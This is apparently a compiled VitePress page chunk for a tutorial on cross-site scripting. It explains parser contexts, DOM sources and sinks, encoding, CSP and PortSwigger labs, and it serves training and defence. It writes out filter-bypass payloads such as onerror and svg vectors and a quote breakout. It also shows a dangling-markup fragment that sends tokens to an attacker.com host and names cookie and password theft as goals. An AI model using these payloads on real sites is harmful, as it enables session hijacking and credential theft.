import{_ as d,C as i,o as l,c,a6 as n,E as s,j as t,a as o}from"./chunks/framework.CMg4qq8Q.js";const v=JSON.parse('{"title":"Cross-Site Scripting (XSS)","description":"HTML parsing contexts, DOM sources and sinks, filter bypasses, CSP, and every PortSwigger XSS lab.","frontmatter":{"title":"Cross-Site Scripting (XSS)","description":"HTML parsing contexts, DOM sources and sinks, filter bypasses, CSP, and every PortSwigger XSS lab."},"headers":[],"relativePath":"xss/index.md","filePath":"xss/index.md"}'),p={name:"xss/index.md"};function h(u,e,g,m,b,w){const a=i("LabGroup"),r=i("TopicComplete");return l(),c("div",null,[e[0]||(e[0]=n('<h1 id="cross-site-scripting-xss-·-the-case-of-the-hijacked-browser" tabindex="-1">Cross-Site Scripting (XSS) · The Case of the Hijacked Browser <a class="header-anchor" href="#cross-site-scripting-xss-·-the-case-of-the-hijacked-browser" aria-label="Permalink to &quot;Cross-Site Scripting (XSS) · The Case of the Hijacked Browser&quot;">​</a></h1><p class="wd-section-lede">Forget memorizing mysterious alert payloads. Cross-Site Scripting (XSS) happens for one simple reason: a web browser cannot tell where the website developer&#39;s instructions end and your submitted text begins. When unescaped user input lands in an executable spot, the browser happily obeys it as live code.</p><div class="wd-callout"><p><strong>💡 Everyday Analogy: The Teleprompter Prank.</strong> Imagine a live news anchor reading a viewer&#39;s tweet off a teleprompter. In the middle of reading the message, the prompter displays: <em>&quot;Loving the weather today! [JUMP OFF CHAIR AND DANCE]&quot;</em>. A human knows brackets are just part of the viewer&#39;s text. But a web browser is an obedient automaton: the moment it encounters markup characters like <code>&lt;script&gt;</code> or event handlers, it instantly switches into command mode and executes whatever instructions follow.</p></div><h2 id="case-file-1-tracing-how-text-turns-into-code" tabindex="-1">Case File #1: Tracing How Text Turns into Code <a class="header-anchor" href="#case-file-1-tracing-how-text-turns-into-code" aria-label="Permalink to &quot;Case File #1: Tracing How Text Turns into Code&quot;">​</a></h2><p>Let&#39;s follow what happens when you type <code>leather boots</code> into an online shop&#39;s search bar.</p><div class="wd-case"><div class="wd-step wd-step--see"><span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span><p>You type <code>leather boots</code> into the search box and press Enter. Your address bar updates to <code>/search?q=leather+boots</code>, and the page heading proudly prints: <em>&quot;Search results for: leather boots&quot;</em>.</p></div><div class="wd-step wd-step--server"><span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span><p>The backend application extracts the <code>q</code> parameter from the URL and pastes it directly into the HTML response template using string concatenation:</p><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Blue</span> = Developer&#39;s HTML Template</span><span><span class="wd-code-input">Gold</span> = Text From Your URL</span></div><span class="wd-code-dev">&lt;h1&gt;Search results for: </span><span class="wd-code-input">leather boots</span><span class="wd-code-dev">&lt;/h1&gt;</span></div></div><div class="wd-step wd-step--break"><span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span><p>The developer assumed the search term would only ever contain normal product words. But when an investigator enters <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the browser&#39;s HTML tokenizer hits the <code>&lt;</code> character, immediately leaves <em>text mode</em>, enters <em>tag-open mode</em>, and executes the script as authentic instructions from the store!</p></div><div class="wd-step wd-step--fix"><span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span><p>Developers encode user input according to where it lands. When reflecting into HTML text, characters like <code>&lt;</code> and <code>&gt;</code> are converted into safe HTML entities (<code>&amp;lt;</code> and <code>&amp;gt;</code>). The browser&#39;s tokenizer displays the angle bracket visually on screen without ever opening a code tag.</p></div></div><h3 id="visual-comparison-plain-text-vs-live-markup" tabindex="-1">Visual Comparison: Plain Text vs. Live Markup <a class="header-anchor" href="#visual-comparison-plain-text-vs-live-markup" aria-label="Permalink to &quot;Visual Comparison: Plain Text vs. Live Markup&quot;">​</a></h3><div class="wd-compare"><div class="wd-compare__card wd-compare__card--expect"><span class="wd-compare__title">💭 What the Developer Expected</span><p>The developer thought the <code>&lt;h1&gt;</code> tag acted like an unbreakable display window: whatever the user searched for would only ever render as static text inside the heading.</p></div><div class="wd-compare__card wd-compare__card--actual"><span class="wd-compare__title">💥 What Actually Happened</span><p>Because raw characters were glued straight into the document, the browser&#39;s HTML parser read the user-supplied <code>&lt;script&gt;</code> as new markup, breaking out of text mode and executing unauthorized JavaScript in the victim&#39;s session.</p></div></div><h3 id="watch-the-parser-switch-meaning-color-by-color" tabindex="-1">Watch the Parser Switch Meaning Color by Color <a class="header-anchor" href="#watch-the-parser-switch-meaning-color-by-color" aria-label="Permalink to &quot;Watch the Parser Switch Meaning Color by Color&quot;">​</a></h3><p>Look at what happens inside the browser&#39;s HTML tokenizer when user input contains HTML tags:</p><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Blue</span> = Developer HTML</span><span><span class="wd-code-input">Gold</span> = Injected Markup</span></div><span class="wd-code-dev">&lt;h1&gt;Search results for: </span><span class="wd-code-input">&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="wd-code-dev">&lt;/h1&gt;</span></div><hr><h2 id="the-5-stage-journey-of-browser-parsing" tabindex="-1">The 5-Stage Journey of Browser Parsing <a class="header-anchor" href="#the-5-stage-journey-of-browser-parsing" aria-label="Permalink to &quot;The 5-Stage Journey of Browser Parsing&quot;">​</a></h2><p>Before a browser shows pixels or runs JavaScript, it processes incoming bytes through five distinct checkpoints. Understanding these stages reveals <strong>which parser sees your input as syntax</strong>:</p><div class="wd-flow"><div class="wd-flow__node"><strong>1. HTTP Byte Stream</strong> Browser receives raw network bytes and decodes character encoding (UTF-8). </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--danger"><strong>2. HTML Tokenizer</strong> Parses characters into tags, attributes, and text nodes. (XSS markup breaks out here!) </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node"><strong>3. DOM Construction</strong> Assembles elements into a living tree of document nodes. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node"><strong>4. Sub-Parsers (JS/CSS/URL)</strong> Invokes JavaScript runtime or URL resolver for scripts, event handlers, and links. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--safe"><strong>5. Execution &amp; Rendering</strong> Runs authorized script logic and displays final visual layout on screen. </div></div><details class="details custom-block"><summary>🔬 Under the Hood: The HTML Tokenizer State Machine</summary><p>The HTML specification defines a state machine, not regular expressions. Four primary states govern how input is interpreted:</p><table tabindex="0"><thead><tr><th>Tokenizer State</th><th>When the Parser Enters It</th><th>How Text is Treated</th><th>What Triggers a State Transition</th></tr></thead><tbody><tr><td><strong>Data State</strong></td><td>Between standard HTML tags</td><td>Regular page text</td><td><code>&lt;</code> immediately enters Tag Open state</td></tr><tr><td><strong>Tag Open State</strong></td><td>Right after <code>&lt;</code> is encountered</td><td>Reads element tag name</td><td><code>&gt;</code> or whitespace closes or advances tag</td></tr><tr><td><strong>Attribute Value State</strong></td><td>Inside an attribute (e.g. <code>value=&quot;...&quot;</code>)</td><td>Raw attribute string</td><td>Matching quote (<code>&quot;</code> or <code>&#39;</code>) ends value</td></tr><tr><td><strong>Script Data State</strong></td><td>Inside a <code>&lt;script&gt;</code> element</td><td>Raw JavaScript text</td><td><code>&lt;/script&gt;</code> closes the script context</td></tr></tbody></table><p><strong>Why this matters:</strong> HTML entity decoding is context-specific. <code>&amp;lt;</code> is decoded to <code>&lt;</code> in Data State, but the parser never re-enters Tag Open state from an already decoded entity. That is why <code>&amp;lt;script&amp;gt;</code> prints harmless visible text instead of launching an alert box!</p></details><hr><h2 id="the-three-families-of-xss" tabindex="-1">The Three Families of XSS <a class="header-anchor" href="#the-three-families-of-xss" aria-label="Permalink to &quot;The Three Families of XSS&quot;">​</a></h2><p>Every XSS investigation falls into one of three distinct categories based on where the payload travels:</p><ol><li><strong>Reflected XSS:</strong> The payload is carried in the current HTTP request (often a URL query parameter) and immediately reflected into the HTTP response. The victim must click a crafted link or submit a malicious form.</li><li><strong>Stored XSS:</strong> The payload is saved into the application&#39;s persistent storage (such as a database comment, profile bio, or forum post) and delivered to anyone who views that page later.</li><li><strong>DOM-based XSS:</strong> The vulnerability exists entirely on the client side. The server returns clean HTML, but client-side JavaScript reads from an untrusted source and passes it to an unsafe sink.</li></ol><h3 id="reflected-and-stored-html-injection-cases" tabindex="-1">Reflected and Stored HTML Injection Cases <a class="header-anchor" href="#reflected-and-stored-html-injection-cases" aria-label="Permalink to &quot;Reflected and Stored HTML Injection Cases&quot;">​</a></h3>',21)),s(a,{ids:"xss-reflected-lab-html-context-nothing-encoded, xss-stored-lab-html-context-nothing-encoded"}),e[1]||(e[1]=n(`<hr><h2 id="dom-xss-sources-and-sinks" tabindex="-1">DOM XSS: Sources and Sinks <a class="header-anchor" href="#dom-xss-sources-and-sinks" aria-label="Permalink to &quot;DOM XSS: Sources and Sinks&quot;">​</a></h2><p>In DOM-based XSS, the malicious input might never touch the server at all. Client-side JavaScript running in the user&#39;s browser reads data from an accessible <strong>Source</strong> and writes it into an execution <strong>Sink</strong>:</p><div class="language-js vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// Source: location.search  ──►  Sink: document.write</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> query</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> URLSearchParams</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(location.search).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">get</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;q&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">write</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;img src=&quot;/banner?query=&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> query </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&quot;&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="wd-flow"><div class="wd-flow__node wd-flow__node--danger"><strong>Taint Source</strong> Input enters via <code>location.search</code>, <code>hash</code>, or <code>postMessage</code>. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node"><strong>Client-Side Script</strong> Page logic manipulates, unescapes, or concatenates the data string. </div><span class="wd-flow__arrow">→</span><div class="wd-flow__node wd-flow__node--danger"><strong>Dangerous Sink</strong> Browser executes payload via <code>innerHTML</code>, <code>document.write</code>, or <code>location</code>. </div></div><details class="details custom-block"><summary>🔬 Under the Hood: Why innerHTML Doesn&#39;t Execute <code>&lt;script&gt;</code> Tags</summary><p>When JavaScript sets <code>element.innerHTML = markup</code>, the browser invokes the HTML <em>fragment parser</em>. The HTML specification explicitly marks scripts inserted through <code>innerHTML</code> as <strong>already evaluated</strong> so they do not run!</p><p>However, event-driven elements like <code>&lt;img src=&quot;invalid&quot; onerror=&quot;alert(1)&quot;&gt;</code> or <code>&lt;svg onload=&quot;alert(1)&quot;&gt;</code> create elements that fire real browser events upon loading or failing. That is why DOM XSS exploits rely on event attributes rather than static <code>&lt;script&gt;</code> tags.</p></details>`,6)),s(a,{ids:"xss-lab-document-write-sink, xss-lab-innerhtml-sink, xss-lab-jquery-href-attribute-sink, xss-lab-jquery-selector-hash-change-event, xss-lab-document-write-sink-inside-select-element, xss-lab-dom-xss-reflected, xss-lab-dom-xss-stored"}),e[2]||(e[2]=n('<hr><h2 id="context-is-king-encoding-by-output-position" tabindex="-1">Context is King: Encoding by Output Position <a class="header-anchor" href="#context-is-king-encoding-by-output-position" aria-label="Permalink to &quot;Context is King: Encoding by Output Position&quot;">​</a></h2><p>The same exact character means completely different things depending on where it lands in the document. A defensive fix must match the <strong>output context</strong>, not just strip characters:</p><table tabindex="0"><thead><tr><th>Target Context</th><th>Code Template</th><th>Required Escaping</th><th>Why the Context is Sensitive</th></tr></thead><tbody><tr><td><strong>HTML Text</strong></td><td><code>&lt;p&gt;USER_INPUT&lt;/p&gt;</code></td><td><code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code></td><td><code>&lt;</code> transitions tokenizer into Tag Open state</td></tr><tr><td><strong>Quoted Attribute</strong></td><td><code>&lt;input value=&quot;USER_INPUT&quot;&gt;</code></td><td><code>&amp;</code>, <code>&quot;</code> (and <code>&lt;</code>)</td><td><code>&quot;</code> breaks out of the attribute value</td></tr><tr><td><strong>Unquoted Attribute</strong></td><td><code>&lt;input value=USER_INPUT&gt;</code></td><td>Whitespace, <code>&gt;</code>, quotes</td><td>Any space or <code>&gt;</code> ends the attribute immediately</td></tr><tr><td><strong>JavaScript String</strong></td><td><code>var query = &#39;USER_INPUT&#39;;</code></td><td><code>\\</code>, <code>&#39;</code>, <code>&quot;</code>, newline</td><td>Quotes close the string; backslashes neutralize escapes</td></tr><tr><td><strong>URL Parameter</strong></td><td><code>&lt;a href=&quot;/search?q=USER_INPUT&quot;&gt;</code></td><td>URL encode + HTML encode</td><td>Involves two different parsers with different grammars</td></tr></tbody></table>',4)),s(a,{ids:"xss-lab-attribute-angle-brackets-html-encoded, xss-lab-href-attribute-double-quotes-html-encoded, xss-lab-javascript-string-angle-brackets-html-encoded"}),e[3]||(e[3]=n('<hr><h2 id="filter-bypasses-blocklists-lose-to-grammar" tabindex="-1">Filter Bypasses: Blocklists Lose to Grammar <a class="header-anchor" href="#filter-bypasses-blocklists-lose-to-grammar" aria-label="Permalink to &quot;Filter Bypasses: Blocklists Lose to Grammar&quot;">​</a></h2><p>When developers attempt to defend against XSS by maintaining a &quot;bad tag list&quot; (like blocking <code>&lt;script&gt;</code> or <code>&lt;object&gt;</code>), the browser&#39;s enormous HTML specification almost always provides an alternative path.</p><p>If <code>&lt;script&gt;</code> is blocked, modern browsers support dozens of tags that trigger JavaScript via event handlers:</p><ul><li><code>&lt;img src=x onerror=alert(1)&gt;</code></li><li><code>&lt;svg onload=alert(1)&gt;</code></li><li><code>&lt;body onpageshow=alert(1)&gt;</code></li><li>Custom elements: HTML allows any tag containing a hyphen (e.g., <code>&lt;custom-tag tabindex=1 onfocus=alert(1) autofocus&gt;</code>).</li></ul>',5)),s(a,{ids:"xss-lab-html-context-with-most-tags-and-attributes-blocked, xss-lab-html-context-with-all-standard-tags-blocked, xss-lab-some-svg-markup-allowed, xss-lab-canonical-link-tag"}),e[4]||(e[4]=n('<details class="details custom-block"><summary>🔬 Under the Hood: Why the Canonical Link Tag is Vulnerable</summary><p>A tag like <code>&lt;link rel=&quot;canonical&quot; href=&quot;USER_INPUT&quot;&gt;</code> seems harmless because links don&#39;t execute scripts on their own. But if the application reflects user input into the <code>href</code> attribute without encoding quotes, an investigator can inject <code>accesskey=&#39;x&#39; onclick=&#39;alert(1)&#39;</code>. Pressing the shortcut key combination on the keyboard immediately triggers the click event!</p></details><hr><h2 id="escaping-the-escape-javascript-string-contexts" tabindex="-1">Escaping the Escape: JavaScript String Contexts <a class="header-anchor" href="#escaping-the-escape-javascript-string-contexts" aria-label="Permalink to &quot;Escaping the Escape: JavaScript String Contexts&quot;">​</a></h2><p>When user input lands inside a <code>&lt;script&gt;</code> tag inside quotes (e.g. <code>var search = &#39;INPUT&#39;;</code>), simple HTML entity encoding is often skipped by developers who instead prefix quotes with backslashes (<code>\\&#39;</code>). This creates subtle bypasses:</p><ol><li><strong>Backslash Collisions:</strong> If the server escapes <code>&#39;</code> to <code>\\&#39;</code> but fails to escape <code>\\</code>, entering <code>\\&#39;;alert(1)//</code> turns into <code>\\\\&#39;;alert(1)//</code>. The double backslash pairs up as one literal backslash, leaving the single quote unescaped to break out of the string!</li><li><strong>Template Literals:</strong> Modern JavaScript uses backticks (<code><code>...</code></code>) for template strings. Escaping quotes does nothing to close a backtick container.</li><li><strong>HTML Entity Decode Order:</strong> In inline event handlers (like <code>onclick=&quot;...&quot;</code>), the browser decodes HTML entities <strong>before</strong> passing the code to the JavaScript engine.</li></ol><div class="wd-codesplit"><div class="wd-codesplit__legend"><span><span class="wd-code-dev">Developer Template</span></span><span><span class="wd-code-input">Injected Input</span></span></div><span class="wd-code-dev">var q = &#39;</span><span class="wd-code-input">\\&#39;; alert(1); //</span><span class="wd-code-dev">&#39;;</span></div>',6)),s(a,{ids:"xss-lab-javascript-string-single-quote-backslash-escaped, xss-lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped, xss-lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped, xss-lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped"}),e[5]||(e[5]=t("hr",null,null,-1)),e[6]||(e[6]=t("h2",{id:"client-side-template-engines-angularjs",tabindex:"-1"},[o("Client-Side Template Engines (AngularJS) "),t("a",{class:"header-anchor",href:"#client-side-template-engines-angularjs","aria-label":'Permalink to "Client-Side Template Engines (AngularJS)"'},"​")],-1)),e[7]||(e[7]=t("p",null,[o("Client-side frameworks like AngularJS scan the DOM for double-curly-bracket expressions like "),t("code",null,"{{ 1 + 1 }}"),o(". If server-side code renders user input directly into an AngularJS-scoped container, the input isn't just text—it is parsed as a client-side template expression.")],-1)),e[8]||(e[8]=t("p",null,[o("Even without quotes or standard HTML tags, expressions can climb through constructor scopes to access the global "),t("code",null,"Function"),o(" constructor and execute code.")],-1)),s(a,{ids:"xss-lab-angularjs-expression, xss-lab-angular-sandbox-escape-without-strings, xss-lab-angular-sandbox-escape-and-csp"}),e[9]||(e[9]=n('<hr><h2 id="browser-guardrails-content-security-policy-csp" tabindex="-1">Browser Guardrails: Content Security Policy (CSP) <a class="header-anchor" href="#browser-guardrails-content-security-policy-csp" aria-label="Permalink to &quot;Browser Guardrails: Content Security Policy (CSP)&quot;">​</a></h2><p>Content Security Policy (CSP) is an HTTP response header that acts as a seatbelt. It restricts which script domains may run and blocks inline scripts unless authorized by a secret nonce or cryptographic hash:</p><div class="language-http vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Security-Policy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> default-src &#39;self&#39;; script-src &#39;self&#39; https://trusted-cdn.com;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>When direct script execution is constrained, investigators look for <strong>policy injection</strong> (injecting semicolons into reflected policy tokens) or <strong>dangling markup</strong> (injecting an unclosed <code>&lt;img src=&quot;https://attacker.com/?</code> that lets the browser swallow sensitive tokens into an outgoing request).</p>',5)),s(a,{ids:"xss-lab-event-handlers-and-href-attributes-blocked, xss-lab-javascript-url-some-characters-blocked, xss-lab-very-strict-csp-with-dangling-markup-attack, xss-lab-csp-bypass"}),e[10]||(e[10]=n('<hr><h2 id="what-xss-actually-achieves-in-an-investigation" tabindex="-1">What XSS Actually Achieves in an Investigation <a class="header-anchor" href="#what-xss-actually-achieves-in-an-investigation" aria-label="Permalink to &quot;What XSS Actually Achieves in an Investigation&quot;">​</a></h2><p>Popping an <code>alert(1)</code> dialog confirms the presence of an execution bug. In real-world security assessments, XSS is chained to demonstrate tangible impact:</p><ul><li><strong>Session Hijacking:</strong> Reading <code>document.cookie</code> (when the <code>HttpOnly</code> flag is missing) to steal active sessions.</li><li><strong>Credential Harvesting:</strong> Injecting convincing fake login prompts over the page to capture submitted passwords.</li><li><strong>On-Behalf-of Actions (CSRF):</strong> Reading anti-CSRF tokens directly from the page DOM and dispatching authenticated state-changing requests with the victim&#39;s session.</li></ul>',4)),s(a,{ids:"xss-lab-stealing-cookies, xss-lab-capturing-passwords, xss-lab-perform-csrf"}),e[11]||(e[11]=t("div",{class:"wd-callout wd-callout--warn"},[t("p",null,[t("strong",null,"🛡️ The Detective's Defense Blueprint."),o(" Always context-encode user data before placing it into HTML. Use modern web frameworks that automatically encode variables by default. Store sensitive session cookies with the "),t("code",null,"HttpOnly"),o(" and "),t("code",null,"Secure"),o(" flags, and enforce a strict, nonce-based Content Security Policy.")])],-1)),s(r,{"topic-id":"cross-site-scripting",label:"Mark the XSS topic complete"})])}const y=d(p,[["render",h]]);export{v as __pageData,y as default};
